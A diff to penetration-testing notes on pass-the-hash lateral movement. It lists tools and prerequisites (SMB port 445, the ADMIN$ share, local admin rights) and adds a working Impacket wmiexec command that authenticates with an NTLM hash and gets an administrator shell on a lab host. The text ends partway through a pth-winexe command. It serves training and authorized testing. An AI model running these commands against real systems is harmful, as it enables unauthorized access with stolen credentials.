@@ -159,11 +159,41 @@ corp\jen
 
 PTH only works for NTLM authentication, not for Kerberos authentication.
 
-Tools: PsExec (Metasploit), [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) or [ https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)
+Tools:&#x20;
 
+* PsExec (Metasploit), [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
+* Passing-the-hash toolkit
+* Impacket [https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)
 
+Prerequisites that must be met:
 
-Pth-winexe
+1. SMB connection - port 445
+2. Windows File and Printer Sharing feature to be enabled
+3. admin share called ADMIN$ to be available
+
+To establish a connection to this share, the attacker must present valid credentials with local administrative permissions. In other words, this type of lateral movement typically requires local administrative rights.
+
+This method works for Active Directory domain accounts and the built-in local administrator account. However, due to the 2014 security update, this technique can not be used to authenticate as any other local admin account.
+
+### wmiexec
+
+{% code title="Passing the hash using Impacket wmiexec" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+FILES04
+
+C:\>whoami
+files04\administrator
+```
+{% endcode %}
+
+### Pth-winexe
 
 ```
 kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
